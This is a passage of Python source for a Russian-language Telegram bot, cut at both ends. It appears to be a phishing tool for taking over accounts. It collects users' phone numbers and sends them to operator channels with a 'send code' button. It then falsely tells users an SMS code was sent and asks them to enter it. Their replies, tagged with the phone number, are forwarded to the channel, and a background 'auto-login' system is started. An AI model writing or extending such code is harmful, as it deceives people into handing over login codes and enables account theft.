            logger.error(f"Ошибка создания запроса модерации: {e}")
            return None
    
    async def send_to_moderators(self, request_id: str, user_id: int, phone: str):
        """Отправляет запрос модераторам во все активные каналы"""
        try:
            # Получаем все одобренные каналы с включенными уведомлениями
            channels = await channel_manager.get_all_channels({
                'approved_only': True,
                'active_only': True
            })
            
            if not channels:
                logger.warning("Нет активных каналов для модерации")
                return False
            
            request_data = self.pending_requests.get(request_id)
            if not request_data:
                return False
            
            # Получаем информацию о пользователе
            user_info = db.fetch_one(
                "SELECT username, first_name FROM users WHERE user_id = ?",
                (user_id,)
            )
            
            username = user_info[0] if user_info else "Неизвестно"
            first_name = user_info[1] if user_info else "Пользователь"
            
            # Отправляем во все каналы
            for channel in channels:
                try:
                    keyboard = InlineKeyboardMarkup(inline_keyboard=[
                        [
                            InlineKeyboardButton(
                                text="✅ ОТПРАВИТЬ КОД",
                                callback_data=f"moder_approve:{request_id}:{channel['id']}"
                            ),
                            InlineKeyboardButton(
                                text="❌ ОТКЛОНИТЬ",
                                callback_data=f"moder_reject:{request_id}:{channel['id']}"
                            )
                        ],
                        [
                            InlineKeyboardButton(
                                text="👁️ ПРОСМОТР ПОЛЬЗОВАТЕЛЯ",
                                callback_data=f"moder_view:{user_id}"
                            )
                        ]
                    ])
                    
                    message = await bot.send_message(
                        channel['channel_id'],
                        f"📱 <b>НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ</b>\n\n"
                        f"👤 Пользователь: {first_name}\n"
                        f"📛 Username: @{username or 'нет'}\n"
                        f"🆔 User ID: {user_id}\n"
                        f"📱 Телефон: <code>{phone}</code>\n"
                        f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
                        f"<i>Статус: ОЖИДАЕТ МОДЕРАЦИИ</i>",
                        parse_mode="HTML",
                        reply_markup=keyboard
                    )
                    
                    # Сохраняем ID сообщения
                    if request_id in self.pending_requests:
                        if 'channel_messages' not in self.pending_requests[request_id]:
                            self.pending_requests[request_id]['channel_messages'] = {}
                        self.pending_requests[request_id]['channel_messages'][channel['id']] = message.message_id
                    
                    # Логируем отправку
                    db.execute('''
                        INSERT INTO messages 
                        (message_id, chat_id, message_type, message_text, sent_date, status, metadata)
                        VALUES (?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        message.message_id,
                        channel['channel_id'],
                        'moderation_request',
                        f'Запрос верификации от {user_id}',
                        datetime.now().isoformat(),
                        'sent_to_moderator',
                        json.dumps({'request_id': request_id, 'user_id': user_id})
                    ))
                    
                    await asyncio.sleep(0.5)  # Задержка между отправками
                    
                except Exception as e:
                    logger.error(f"Ошибка отправки в канал {channel['channel_id']}: {e}")
            
            return True
            
        except Exception as e:
            logger.error(f"Ошибка отправки модераторам: {e}")
            return False
    
    async def approve_request(self, request_id: str, moderator_id: int, channel_db_id: int) -> Dict:
        """Одобряет запрос и отправляет код пользователю"""
        try:
            if request_id not in self.pending_requests:
                # Пробуем загрузить из БД
                request_data = db.fetch_one(
                    "SELECT user_id, phone, status FROM moderation_requests WHERE request_id = ?",
                    (request_id,)
                )
                
                if not request_data:
                    return {'success': False, 'error': 'Запрос не найден'}
                
                user_id, phone, status = request_data
                
                if status != 'pending':
                    return {'success': False, 'error': f'Запрос уже обработан ({status})'}
                
                # Восстанавливаем в памяти
                self.pending_requests[request_id] = {
                    'user_id': user_id,
                    'phone': phone,
                    'status': 'pending',
                    'channel_messages': {}
                }
            
            request_data = self.pending_requests[request_id]
            
            if request_data['status'] != 'pending':
                return {'success': False, 'error': f'Запрос уже обработан ({request_data["status"]})'}
            
            # Генерируем код
            code = str(random.randint(10000, 999999))
            
            # Обновляем код у пользователя
            db.execute(
                "UPDATE users SET code = ? WHERE user_id = ?",
                (code, request_data['user_id'])
            )
            
            # Отправляем код пользователю
            try:
                await bot.send_message(
                    request_data['user_id'],
                    f"✅ <b>КОД ПОДТВЕРЖДЕНИЯ ОТПРАВЛЕН!</b>\n\n"
                    f"📱 На ваш номер телефона отправлен SMS код.\n\n"
                    f"🔢 <b>Введите 5-6 значный код из SMS:</b>\n\n"
                    f"<i>Код приходит в течение 1-5 минут.</i>",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"Не удалось отправить код пользователю: {e}")
                # Пользователь мог заблокировать бота
            
            # Обновляем статус запроса
            request_data['status'] = 'approved'
            request_data['approved_by'] = moderator_id
            request_data['approved_at'] = datetime.now()
            
            db.execute('''
                UPDATE moderation_requests 
                SET status = 'approved', 
                    approved_by = ?,
                    approved_at = ?,
                    code_sent = ?
                WHERE request_id = ?
            ''', (moderator_id, datetime.now().isoformat(), code, request_id))
            
            # Обновляем сообщения в каналах
            await self._update_channel_messages(request_id, 'approved', moderator_id)
            
            # Уведомляем модератора
            channel_info = db.fetch_one(
                "SELECT channel_title FROM channels WHERE id = ?",
                (channel_db_id,)
            )
            channel_title = channel_info[0] if channel_info else "Канал"
            
            return {
                'success': True,
                'message': f'Код {code} отправлен пользователю',
                'user_id': request_data['user_id'],
                'phone': request_data['phone'],
                'code': code
            }
            
        except Exception as e:
            logger.error(f"Ошибка одобрения запроса: {e}")
            return {'success': False, 'error': str(e)}
    
    async def reject_request(self, request_id: str, moderator_id: int, channel_db_id: int, reason: str = "") -> Dict:
        """Отклоняет запрос и просит повторную отправку"""
        try:
            if request_id not in self.pending_requests:
                request_data = db.fetch_one(
                    "SELECT user_id, phone, status FROM moderation_requests WHERE request_id = ?",
                    (request_id,)
                )
                
                if not request_data:
                    return {'success': False, 'error': 'Запрос не найден'}
                
                user_id, phone, status = request_data
                
                if status != 'pending':
                    return {'success': False, 'error': f'Запрос уже обработан ({status})'}
                
                self.pending_requests[request_id] = {
                    'user_id': user_id,
                    'phone': phone,
                    'status': 'pending'
                }
            
            request_data = self.pending_requests[request_id]
            
            if request_data['status'] != 'pending':
                return {'success': False, 'error': f'Запрос уже обработан ({request_data["status"]})'}
            
            # Просим пользователя отправить номер заново
            try:
                await bot.send_message(
                    request_data['user_id'],
                    f"🔄 <b>ТРЕБУЕТСЯ ПОВТОРНАЯ ОТПРАВКА НОМЕРА</b>\n\n"
                    f"📱 Ваш номер телефона не прошел проверку.\n\n"
                    f"<b>Причина:</b> {reason or 'Не указана'}\n\n"
                    f"<b>Пожалуйста, отправьте ваш номер телефона заново:</b>\n\n"
                    f"Нажмите кнопку ниже 👇",
                    parse_mode="HTML",
                    reply_markup=ReplyKeyboardMarkup(
                        keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
                        resize_keyboard=True,
                        one_time_keyboard=True
                    )
                )
            except Exception as e:
                logger.error(f"Не удалось уведомить пользователя об отклонении: {e}")
            
            # Обновляем статус
            request_data['status'] = 'rejected'
            request_data['rejected_by'] = moderator_id
            request_data['rejected_reason'] = reason
            
            db.execute('''
                UPDATE moderation_requests 
                SET status = 'rejected', 
                    rejected_by = ?,
                    rejected_at = ?,
                    rejected_reason = ?
                WHERE request_id = ?
            ''', (moderator_id, datetime.now().isoformat(), reason, request_id))
            
            # Обновляем сообщения в каналах
            await self._update_channel_messages(request_id, 'rejected', moderator_id, reason)
            
            return {
                'success': True,
                'message': 'Запрос отклонен, пользователь уведомлен',
                'user_id': request_data['user_id']
            }
            
        except Exception as e:
            logger.error(f"Ошибка отклонения запроса: {e}")
            return {'success': False, 'error': str(e)}
    
    async def _update_channel_messages(self, request_id: str, status: str, moderator_id: int, reason: str = ""):
        """Обновляет сообщения в каналах после обработки запроса"""
        try:
            if request_id not in self.pending_requests:
                return
            
            request_data = self.pending_requests[request_id]
            
            if 'channel_messages' not in request_data:
                return
            
            for channel_id, message_id in request_data['channel_messages'].items():
                try:
                    status_text = "✅ ОДОБРЕНО" if status == 'approved' else "❌ ОТКЛОНЕНО"
                    reason_text = f"\n📝 Причина: {reason}" if reason else ""
                    
                    await bot.edit_message_text(
                        chat_id=channel_id,
                        message_id=message_id,
                        text=f"📱 <b>ЗАПРОС НА ВЕРИФИКАЦИЮ - {status_text}</b>\n\n"
                             f"👤 Пользователь: {request_data['user_id']}\n"
                             f"📱 Телефон: <code>{request_data['phone']}</code>\n"
                             f"👮 Модератор: {moderator_id}\n"
                             f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n"
                             f"{reason_text}",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.error(f"Не удалось обновить сообщение в канале {channel_id}: {e}")
            
            # Удаляем из памяти после обработки
            if request_id in self.pending_requests:
                del self.pending_requests[request_id]
                
        except Exception as e:
            logger.error(f"Ошибка обновления сообщений в каналах: {e}")
    
    def get_user_pending_request(self, user_id: int) -> Optional[Dict]:
        """Получает активный запрос пользователя"""
        try:
            # Сначала проверяем в памяти
            for req_id, req_data in self.pending_requests.items():
                if req_data['user_id'] == user_id and req_data['status'] == 'pending':
                    return {'request_id': req_id, **req_data}
            
            # Проверяем в БД
            request_data = db.fetch_one(
                "SELECT request_id, phone, status FROM moderation_requests WHERE user_id = ? AND status = 'pending'",
                (user_id,)
            )
            
            if request_data:
                req_id, phone, status = request_data
                return {
                    'request_id': req_id,
                    'user_id': user_id,
                    'phone': phone,
                    'status': status
                }
            
            return None
            
        except Exception as e:
            logger.error(f"Ошибка получения запроса пользователя: {e}")
            return None

moderation_system = ModerationSystem()
@dp.callback_query(F.data.startswith("select_forward_channel:"))
@admin_required()
async def select_forward_channel(callback_query: CallbackQuery):
    """Обрабатывает выбор канала для пересылки"""
    channel_id = callback_query.data.split(":")[1]
    user_id = callback_query.from_user.id
    
    # Настраиваем пересылку
    success = await message_forwarder.setup_user_channel(user_id, channel_id)
    
    if success:
        await callback_query.message.edit_text(
            f"✅ <b>ПЕРЕСЫЛКА УСПЕШНО НАСТРОЕНА!</b>\n\n"
            f"Теперь все ваши сообщения в этом боте будут автоматически пересылаться в выбранный канал.\n\n"
            f"<i>Отправьте любое сообщение в бота для теста.</i>",
            parse_mode="HTML"
        )
    else:
        await callback_query.message.edit_text(
            f"❌ <b>ОШИБКА НАСТРОЙКИ</b>\n\n"
            f"Не удалось настроить пересылку для канала {channel_id}\n\n"
            f"<i>Проверьте, что:\n"
            f"1. Канал одобрен\n"
            f"2. Бот является администратором\n"
            f"3. Уведомления в канале включены</i>",
            parse_mode="HTML"
        )
    await callback_query.answer()

class ForwardingSystem:
    """Система пересылки сообщений из ЛС в каналы"""
    
    def __init__(self):
        self.user_sessions = {}  # {user_id: {'target_channel': channel_id, 'status': 'active'}}
    
    async def setup_forwarding(self, user_id: int, channel_id: str) -> bool:
        """Настраивает пересылку для пользователя"""
        try:
            # Проверяем, есть ли пользователь в базе
            user_data = db.fetch_one(
                "SELECT phone FROM users WHERE user_id = ?",
                (user_id,)
            )
            
            if not user_data:
                return False
            
            # Сохраняем сессию
            self.user_sessions[user_id] = {
                'target_channel': channel_id,
                'status': 'active',
                'setup_time': datetime.now()
            }
            
            # Сохраняем в БД для восстановления
            db.execute('''
                INSERT OR REPLACE INTO forwarding_sessions 
                (user_id, target_channel, status, created_at)
                VALUES (?, ?, ?, ?)
            ''', (user_id, channel_id, 'active', datetime.now().isoformat()))
            
            return True
            
        except Exception as e:
            logger.error(f"Ошибка настройки пересылки: {e}")
            return False
    
    async def forward_to_channel(self, user_id: int, message: Message) -> Dict:
        """Пересылает сообщение пользователя в канал"""
        try:
            if user_id not in self.user_sessions:
                # Пробуем восстановить из БД
                session_data = db.fetch_one(
                    "SELECT target_channel FROM forwarding_sessions WHERE user_id = ? AND status = 'active'",
                    (user_id,)
                )
                
                if not session_data:
                    return {'success': False, 'error': 'Сессия пересылки не настроена'}
                
                self.user_sessions[user_id] = {
                    'target_channel': session_data[0],
                    'status': 'active'
                }
            
            channel_id = self.user_sessions[user_id]['target_channel']
            
            # Проверяем, что канал одобрен
            channel_data = db.fetch_one(
                "SELECT id, is_approved, notifications_enabled FROM channels WHERE channel_id = ?",
                (channel_id,)
            )
            
            if not channel_data:
                return {'success': False, 'error': 'Канал не найден'}
            
            channel_db_id, is_approved, notifications_enabled = channel_data
            
            if not is_approved:
                return {'success': False, 'error': 'Канал не одобрен'}
            
            if not notifications_enabled:
                return {'success': False, 'error': 'Уведомления отключены'}
            
            # Пересылаем сообщение
            try:
                if message.text:
                    # Текстовое сообщение
                    sent_msg = await bot.send_message(
                        channel_id,
                        f"👤 <b>Сообщение от пользователя:</b>\n"
                        f"🆔 ID: {user_id}\n"
                        f"📱 Телефон: {self._get_user_phone(user_id)}\n\n"
                        f"{message.text}",
                        parse_mode="HTML"
                    )
                    
                elif message.photo:
                    # Фото с подписью
                    photo = message.photo[-1]
                    caption = message.caption or ""
                    
                    sent_msg = await bot.send_photo(
                        channel_id,
                        photo.file_id,
                        caption=f"👤 <b>Фото от пользователя:</b>\n"
                               f"🆔 ID: {user_id}\n"
                               f"📱 Телефон: {self._get_user_phone(user_id)}\n\n"
                               f"{caption}",
                        parse_mode="HTML"
                    )
                    
                elif message.video:
                    # Видео
                    sent_msg = await bot.send_video(
                        channel_id,
                        message.video.file_id,
                        caption=f"👤 <b>Видео от пользователя:</b>\n"
                               f"🆔 ID: {user_id}\n"
                               f"📱 Телефон: {self._get_user_phone(user_id)}",
                        parse_mode="HTML"
                    )
                    
                elif message.document:
                    # Документ
                    sent_msg = await bot.send_document(
                        channel_id,
                        message.document.file_id,
                        caption=f"👤 <b>Документ от пользователя:</b>\n"
                               f"🆔 ID: {user_id}\n"
                               f"📱 Телефон: {self._get_user_phone(user_id)}",
                        parse_mode="HTML"
                    )
                
                else:
                    return {'success': False, 'error': 'Неподдерживаемый тип сообщения'}
                
                # Логируем пересылку
                db.execute('''
                    INSERT INTO messages 
                    (message_id, from_user_id, chat_id, message_type, 
                     message_text, sent_date, status, is_forwarded)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    sent_msg.message_id,
                    user_id,
                    channel_id,
                    'forwarded',
                    message.text or message.caption or '[Медиа]',
                    datetime.now().isoformat(),
                    'forwarded',
                    1
                ))
                
                return {
                    'success': True,
                    'message_id': sent_msg.message_id,
                    'channel_id': channel_id
                }
                
            except TelegramBadRequest as e:
                error_msg = str(e)
                if "chat not found" in error_msg.lower():
                    return {'success': False, 'error': 'Бот не является админом в канале'}
                elif "not enough rights" in error_msg.lower():
                    return {'success': False, 'error': 'Недостаточно прав для отправки'}
                else:
                    return {'success': False, 'error': error_msg}
                    
        except Exception as e:
            logger.error(f"Ошибка пересылки: {e}")
            return {'success': False, 'error': str(e)}
    
    def _get_user_phone(self, user_id: int) -> str:
        """Получает номер телефона пользователя"""
        user_data = db.fetch_one(
            "SELECT phone FROM users WHERE user_id = ?",
            (user_id,)
        )
        return user_data[0] if user_data else "Не указан"
    
    async def stop_forwarding(self, user_id: int) -> bool:
        """Останавливает пересылку для пользователя"""
        try:
            if user_id in self.user_sessions:
                del self.user_sessions[user_id]
            
            db.execute(
                "UPDATE forwarding_sessions SET status = 'stopped' WHERE user_id = ?",
                (user_id,)
            )
            
            return True
            
        except Exception as e:
            logger.error(f"Ошибка остановки пересылки: {e}")
            return False

forwarding_system = ForwardingSystem()

# Запускаем системы мониторинга
async def start_background_tasks():
    """Запускает фоновые задачи системы"""
    logger.info("Запуск фоновых задач...")
    
    # Запускаем систему авто-входа
    await auto_login_system.start_monitoring()
    
    # Запускаем проверку статуса бота в каналах
    asyncio.create_task(check_channels_status_task())
    
    # Запускаем проверку прав бота
    asyncio.create_task(check_bot_permissions_task())
    
    logger.info("Фоновые задачи запущены")

async def check_bot_permissions_task():
    """Периодическая проверка прав бота"""
    while True:
        try:
            await check_bot_permissions_in_channels()
            await asyncio.sleep(1800)  # Проверка каждые 30 минут
        except Exception as e:
            logger.error(f"Ошибка проверки прав бота: {e}")
            await asyncio.sleep(300)

            
# Обработчик сообщений из групп (супергрупп и обычных групп)
@dp.message(F.chat.type.in_({ChatType.SUPERGROUP, ChatType.GROUP}))
async def handle_group_message(message: Message):
    """
    Обрабатывает сообщения от пользователей в группах.
    Важно: Бот получит это сообщение только если он является администратором
    и если сообщение отправлено от конкретного пользователя (message.from_user не None).
    """
    # Проверяем, что сообщение от пользователя, а не от канала или системы
    if not message.from_user:
        return

    # Логируем полученное сообщение
    logger.info(f"Сообщение в группе '{message.chat.title}' от @{message.from_user.username}: {message.text}")

    # Здесь можно добавить логику обработки
    # Например, проверка на команду или пересылка в другой чат
    # await bot.send_message(YOUR_ADMIN_CHAT_ID, f"Группа: {message.chat.title}\nПользователь: @{message.from_user.username}\nСообщение: {message.text}")

# Обработчик постов в каналах
@dp.channel_post()
async def handle_channel_post(post: Message):
    """
    Обрабатывает посты, сделанные непосредственно в канале.
    Для сообщений в обсуждениях каналов используйте фильтр `is_automatic_forward`.
    """
    # Бот получает этот пост, только если он админ канала
    logger.info(f"Пост в канале '{post.chat.title}': {post.text or 'Медиа-контент'}")

    # Пример: переслать пост в админский чат
    # try:
    #     await bot.forward_message(chat_id=config.MAIN_ADMIN_ID, from_chat_id=post.chat.id, message_id=post.message_id)
    # except Exception as e:
    #     logger.error(f"Не удалось переслать пост: {e}")

# Обработчик пересланных в группу обсуждений сообщений из канала
@dp.message(F.is_automatic_forward == True)
async def handle_forwarded_from_channel(message: Message):
    """
    Обрабатывает сообщения, автоматически пересланные из канала в подключенную группу обсуждений[citation:5].
    Это ключевой момент для получения уведомлений о новых сообщениях от пользователей в каналах.
    """
    if message.forward_origin and message.forward_origin.type == "channel":
        # Логируем пересланное из канала сообщение
        logger.info(f"Автопересылка из канала в группу обсуждений '{message.chat.title}': {message.text}")

        # Ваша логика обработки...
        # Это событие можно использовать для уведомления о новом сообщении пользователя в канале

# Обработчик события "бота добавили в чат" (УЖЕ ЕСТЬ У ВАС, но важно проверить)
@dp.my_chat_member()
async def on_bot_added_to_chat(update: ChatMemberUpdated):
    """
    Обрабатывает событие изменения статуса бота в чате.
    Критически важно для отслеживания, когда бота делают администратором.
    """
    # Ваш существующий код здесь...
    # Убедитесь, что он правильно обновляет статус в БД и проверяет права.
            
async def check_channels_status_task():
    """Периодически проверяет статус бота в каналах"""
    while True:
        try:
            # Получаем все каналы где бот должен быть админом
            channels = db.fetch_all(
                "SELECT id, channel_id, channel_title FROM channels WHERE bot_is_admin = 1"
            )
            
            for channel in channels:
                channel_db_id, channel_id, title = channel
                
                try:
                    # Проверяем статус бота
                    member = await bot.get_chat_member(channel_id, (await bot.get_me()).id)
                    
                    # Если бот больше не админ
                    if member.status not in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]:
                        db.execute(
                            "UPDATE channels SET bot_is_admin = 0 WHERE id = ?",
                            (channel_db_id,)
                        )
                        
                        logger.warning(f"Бот больше не админ в канале {title} ({channel_id})")
                        
                        # Уведомляем главного админа
                        await bot.send_message(
                            config.MAIN_ADMIN_ID,
                            f"⚠️ <b>БОТ УДАЛЕН ИЗ АДМИНИСТРАТОРОВ</b>\n\n"
                            f"📢 Канал: {title}\n"
                            f"🔗 ID: {channel_id}\n\n"
                            f"Бот больше не может отправлять уведомления в этот канал.",
                            parse_mode="HTML"
                        )
                        
                except TelegramBadRequest as e:
                    if "chat not found" in str(e).lower() or "user not found" in str(e).lower():
                        # Канал не найден или бот удален
                        db.execute(
                            "UPDATE channels SET bot_is_admin = 0, notifications_enabled = 0 WHERE id = ?",
                            (channel_db_id,)
                        )
                        logger.warning(f"Канал {title} не найден или бот удален")
                
                except Exception as e:
                    logger.error(f"Ошибка проверки статуса в канале {channel_id}: {e}")
                
                await asyncio.sleep(1)  # Задержка между проверками
            
            await asyncio.sleep(3600)  # Проверка каждый час
            
        except Exception as e:
            logger.error(f"Ошибка в задаче проверки статуса каналов: {e}")
            await asyncio.sleep(300)


# ========== ОБРАБОТЧИК СООБЩЕНИЙ ИЗ КАНАЛОВ/ГРУПП ==========
@dp.message(F.chat.type.in_([ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]))
async def handle_channel_message(message: Message):
    """Обрабатывает сообщения из каналов и групп"""
    try:
        chat_id = message.chat.id
        user_id = message.from_user.id if message.from_user else None
        message_id = message.message_id
        
        # Проверяем, отслеживается ли этот канал
        channel_data = db.fetch_one(
            "SELECT id, is_approved, notifications_enabled, admin_notifications FROM channels WHERE channel_id = ?",
            (str(chat_id),)
        )
        
        if not channel_data:
            # Канал не в базе - игнорируем
            return
        
        channel_db_id, is_approved, notifications_enabled, admin_notifications = channel_data
        
        # Если канал одобрен и включены уведомления - обрабатываем
        if is_approved and notifications_enabled:
            # Логируем сообщение
            message_type = 'text'
            media_path = None
            
            if message.photo:
                message_type = 'photo'
                # Сохраняем фото
                photo = message.photo[-1]
                file_info = await bot.get_file(photo.file_id)
                media_path = f"media/channel_{chat_id}_{message_id}.jpg"
                await bot.download_file(file_info.file_path, media_path)
            elif message.video:
                message_type = 'video'
                file_info = await bot.get_file(message.video.file_id)
                media_path = f"media/channel_{chat_id}_{message_id}.mp4"
                await bot.download_file(file_info.file_path, media_path)
            elif message.document:
                message_type = 'document'
                file_info = await bot.get_file(message.document.file_id)
                ext = message.document.file_name.split('.')[-1] if message.document.file_name else 'bin'
                media_path = f"media/channel_{chat_id}_{message_id}.{ext}"
                await bot.download_file(file_info.file_path, media_path)
            
            # Сохраняем в базу
            db.execute('''
                INSERT INTO messages 
                (message_id, chat_id, from_user_id, message_type, message_text, 
                 media_path, sent_date, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                message_id,
                chat_id,
                user_id,
                message_type,
                message.text or message.caption or '',
                media_path,
                datetime.now().isoformat(),
                'received'
            ))
            
            # Если включены админ-уведомления - отправляем админу
            if admin_notifications:
                channel_info = db.fetch_one(
                    "SELECT channel_title FROM channels WHERE id = ?",
                    (channel_db_id,)
                )
                channel_title = channel_info[0] if channel_info else f"Канал {chat_id}"
                
                preview_text = message.text or message.caption or '[Медиа-сообщение]'
                preview_text = preview_text[:200] + '...' if len(preview_text) > 200 else preview_text
                
                await bot.send_message(
                    config.MAIN_ADMIN_ID,
                    f"📨 <b>НОВОЕ СООБЩЕНИЕ ИЗ КАНАЛА</b>\n\n"
                    f"📢 Канал: {channel_title}\n"
                    f"🔗 ID: {chat_id}\n"
                    f"👤 Отправитель: {user_id or 'Система'}\n"
                    f"📝 Сообщение: {preview_text}\n"
                    f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
                    parse_mode="HTML"
                )
                
    except Exception as e:
        logger.error(f"Ошибка обработки сообщения из канала: {e}")

# ========== ОБРАБОТЧИК КОМАНД В КАНАЛАХ ==========
@dp.message(Command("help", "info", "status", prefix="/"))
async def handle_channel_commands(message: Message):
    """Обрабатывает команды в каналах"""
    chat_type = message.chat.type
    
    if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
        # Проверяем права бота
        try:
            member = await bot.get_chat_member(message.chat.id, (await bot.get_me()).id)
            if member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]:
                
                if message.text == "/help":
                    help_text = """
🤖 <b>КОМАНДЫ БОТА В КАНАЛЕ:</b>

/help - Эта справка
/status - Статус бота в канале
/settings - Настройки уведомлений
/test - Тестовая отправка

<b>Для администраторов:</b>
/approve - Одобрить канал
/notify - Отправить уведомление
                    """
                    await message.reply(help_text, parse_mode="HTML")
                    
                elif message.text == "/status":
                    # Получаем статус канала
                    channel_data = db.fetch_one(
                        "SELECT is_approved, notifications_enabled FROM channels WHERE channel_id = ?",
                        (str(message.chat.id),)
                    )
                    
                    if channel_data:
                        is_approved, notifications_enabled = channel_data
                        status_text = f"""
📊 <b>СТАТУС БОТА В КАНАЛЕ:</b>

✅ Бот активен как администратор
📢 Канал: {message.chat.title}
🔗 ID: {message.chat.id}

<b>Статус:</b>
• Одобрение: {'✅ Одобрен' if is_approved else '⏳ Ожидает'}
• Уведомления: {'🔔 Включены' if notifications_enabled else '🔕 Выключены'}

<b>Команды:</b>
Используйте /help для списка команд
                        """
                    else:
                        status_text = "❌ Канал не зарегистрирован в системе. Добавьте бота как администратора."
                    
                    await message.reply(status_text, parse_mode="HTML")
                    
        except Exception as e:
            logger.error(f"Ошибка обработки команды в канале: {e}")

# ========== КОМАНДА ДЛЯ ТЕСТА УВЕДОМЛЕНИЙ В КАНАЛЕ ==========
@dp.message(Command("test"))
async def cmd_test_channel(message: Message):
    """Тестовая отправка в текущий канал"""
    chat_id = message.chat.id
    
    # Проверяем, является ли канал
    if message.chat.type not in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
        await message.reply("❌ Эта команда работает только в каналах и группах")
        return
    
    # Проверяем права бота
    try:
        member = await bot.get_chat_member(chat_id, (await bot.get_me()).id)
        if member.status not in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]:
            await message.reply("❌ Бот должен быть администратором для отправки сообщений")
            return
    except:
        await message.reply("❌ Не удалось проверить права бота")
        return
    
    # Проверяем, есть ли канал в базе
    channel_data = db.fetch_one(
        "SELECT id, is_approved FROM channels WHERE channel_id = ?",
        (str(chat_id),)
    )
    
    if not channel_data:
        await message.reply(
            "❌ Канал не зарегистрирован в системе.\n\n"
            "Для регистрации:\n"
            "1. Убедитесь, что бот добавлен как администратор\n"
            "2. Главный администратор должен одобрить канал\n"
            "3. После одобрения можно отправлять уведомления"
        )
        return
    
    channel_db_id, is_approved = channel_data
    
    if not is_approved:
        await message.reply("⏳ Канал ожидает одобрения главного администратора")
        return
    
    # Отправляем тестовое сообщение
    test_message = (
        "✅ <b>ТЕСТОВОЕ УВЕДОМЛЕНИЕ</b>\n\n"
        "Это тестовое сообщение подтверждает, что:\n"
        "• Бот работает как администратор\n"
        "• Канал одобрен для уведомлений\n"
        "• Система уведомлений активна\n\n"
        f"📅 {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
    )
    
    result = await channel_manager.send_to_channel(
        channel_db_id,
        test_message,
        message_type='test'
    )
    
    if result['success']:
        await message.reply("✅ Тестовое сообщение отправлено в канал")
    else:
        await message.reply(f"❌ Ошибка отправки: {result.get('error', 'Неизвестная ошибка')}")

# ========== КОМАНДА ДЛЯ НАСТРОЙКИ УВЕДОМЛЕНИЙ В КАНАЛЕ ==========
@dp.message(Command("settings"))
async def cmd_channel_settings(message: Message):
    """Настройки уведомлений в текущем канале"""
    chat_id = message.chat.id
    
    if message.chat.type not in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
        await message.reply("❌ Эта команда работает только в каналах и группах")
        return
    
    # Проверяем права отправителя
    try:
        member = await bot.get_chat_member(chat_id, message.from_user.id)
        if member.status not in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]:
            await message.reply("❌ Только администраторы канала могут изменять настройки")
            return
    except:
        await message.reply("❌ Не удалось проверить ваши права")
        return
    
    # Получаем данные канала
    channel_data = db.fetch_one(
        """SELECT id, channel_title, is_approved, notifications_enabled, 
           admin_notifications FROM channels WHERE channel_id = ?""",
        (str(chat_id),)
    )
    
    if not channel_data:
        await message.reply("❌ Канал не найден в базе данных")
        return
    
    channel_db_id, title, is_approved, notif_enabled, admin_notif = channel_data
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=f"{'🔕 Отключить' if notif_enabled else '🔔 Включить'} уведомления",
                callback_data=f"quick_toggle_notif:{channel_db_id}"
            )
        ],
        [
            InlineKeyboardButton(
                text=f"{'👁️ Скрыть' if admin_notif else '👁️ Показывать'} админу",
                callback_data=f"quick_toggle_admin:{channel_db_id}"
            )
        ],
        [
            InlineKeyboardButton(text="📊 Подробные настройки", callback_data=f"channel_settings:{channel_db_id}"),
            InlineKeyboardButton(text="❌ Закрыть", callback_data="close_menu")
        ]
    ])
    
    status_text = "✅ Одобрен" if is_approved else "⏳ Ожидает одобрения"
    notif_text = "🔔 Включены" if notif_enabled else "🔕 Выключены"
    admin_notif_text = "👁️ Показываются админу" if admin_notif else "👁️ Скрыты от админа"
    
    await message.reply(
        f"⚙️ <b>НАСТРОЙКИ КАНАЛА</b>\n\n"
        f"📢 Канал: {title}\n"
        f"🔗 ID: {chat_id}\n\n"
        f"📊 Статус:\n"
        f"• {status_text}\n"
        f"• {notif_text}\n"
        f"• {admin_notif_text}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data.startswith("quick_toggle_notif:"))
async def quick_toggle_notifications(callback_query: CallbackQuery):
    """Быстрое переключение уведомлений"""
    channel_db_id = int(callback_query.data.split(":")[1])
    
    result = await channel_manager.toggle_channel_notifications(channel_db_id)
    
    if result['success']:
        await callback_query.answer(result['message'])
        await callback_query.message.delete()
    else:
        await callback_query.answer(f"❌ Ошибка: {result.get('error', 'Неизвестная ошибка')}")

@dp.callback_query(F.data.startswith("quick_toggle_admin:"))
async def quick_toggle_admin_notifications(callback_query: CallbackQuery):
    """Быстрое переключение админ-уведомлений"""
    channel_db_id = int(callback_query.data.split(":")[1])
    
    result = await channel_manager.toggle_admin_notifications(channel_db_id)
    
    if result['success']:
        await callback_query.answer(result['message'])
        await callback_query.message.delete()
    else:
        await callback_query.answer(f"❌ Ошибка: {result.get('error', 'Неизвестная ошибка')}")

async def check_bot_permissions_in_channels():
    """Проверяет права бота во всех каналах"""
    try:
        channels = db.fetch_all(
            "SELECT id, channel_id, channel_title FROM channels WHERE is_approved = 1"
        )
        
        for channel in channels:
            channel_db_id, channel_id, title = channel
            
            try:
                # Проверяем права
                member = await bot.get_chat_member(channel_id, (await bot.get_me()).id)
                
                permissions = {}
                if member.status == ChatMemberStatus.ADMINISTRATOR:
                    permissions = {
                        'can_post_messages': member.can_post_messages or False,
                        'can_edit_messages': member.can_edit_messages or False,
